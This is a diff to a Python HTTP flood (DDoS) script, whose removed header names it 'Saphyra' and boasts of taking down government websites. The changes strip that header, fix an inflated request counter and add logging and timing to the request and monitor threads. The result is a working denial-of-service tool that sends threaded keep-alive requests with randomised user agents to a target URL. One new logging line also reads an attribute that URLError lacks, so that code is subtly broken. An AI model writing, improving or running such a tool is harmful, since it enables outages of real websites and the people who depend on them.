@@ -1,19 +1,11 @@
-# ----------------------------------------------------------------------------------------------
-# Saphyra - DDoS Tool
-#
-# The DDoS Protocol is the most massive type of attack
-# This tool can tangodown nasa and more gov websites
-# 
-#
-# author : Anonymous , version 1.0
-# ----------------------------------------------------------------------------------------------
 import urllib.request
 import urllib.error
 import sys
 import threading
 import random
 import re
-
+import datetime
+import logging
 
 #global params
 url=''
@@ -26,7 +18,7 @@ safe=0
 
 def inc_counter():
 	global request_counter
-	request_counter+=9999
+	request_counter+=1
 
 def set_flag(val):
 	global flag
@@ -34,7 +26,7 @@ def set_flag(val):
 
 def set_safe():
 	global safe
-	safe=1	
+	safe=1
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
@@ -3428,17 +3420,23 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib.request.urlopen(request)
+		# urllib.request.urlopen(request)
+		response = urllib.request.urlopen(request)
+
 	except urllib.error.HTTPError as e:
-			#print e.code
-			set_flag(1)
-			code=500
+		#print e.code
+		logging.error(f"HTTP Error {e.code}: {e.reason} {e.read().decode('utf-8')}")
+		set_flag(1)
+		code=500
 	except urllib.error.URLError as e:
-			#print e.reason
-			sys.exit()
+		#print e.reason
+		logging.error(f"URL Error {e.code}: {e.reason}")
+		sys.exit()
 	else:
-			inc_counter()
-			urllib.request.urlopen(request)
+		inc_counter()
+		logging.info(f"Request succeeded - URL: {url}")
+		# urllib.request.urlopen(request)
+		response.read()
 	return(code)		
 
 	
@@ -3455,11 +3453,21 @@ class HTTPThread(threading.Thread):
 
 # monitors http threads and counts requests
 class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous!=request_counter):
-				previous=request_counter
+    def run(self):
+        previous = request_counter
+        start_time = datetime.datetime.now()
+        logging.info(f"MonitorThread started at {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+
+        while flag == 0:
+			# +100 ensures that the console is not flooded with messages and counter has actually changed since the last print statement.
+            if (previous + 100 < request_counter) and (previous != request_counter):
+                previous = request_counter
+                logging.info(f"{request_counter:,d} requests sent so far")
+
+        end_time = datetime.datetime.now()
+        elapsed_time = round((end_time - start_time).total_seconds(), 3)
+        logging.info(f"MonitorThread stopped at {end_time.strftime('%Y-%m-%d %H:%M:%S')}, ran for {elapsed_time} seconds")
+	
 #execute 
 if len(sys.argv) < 2:
 	sys.exit()
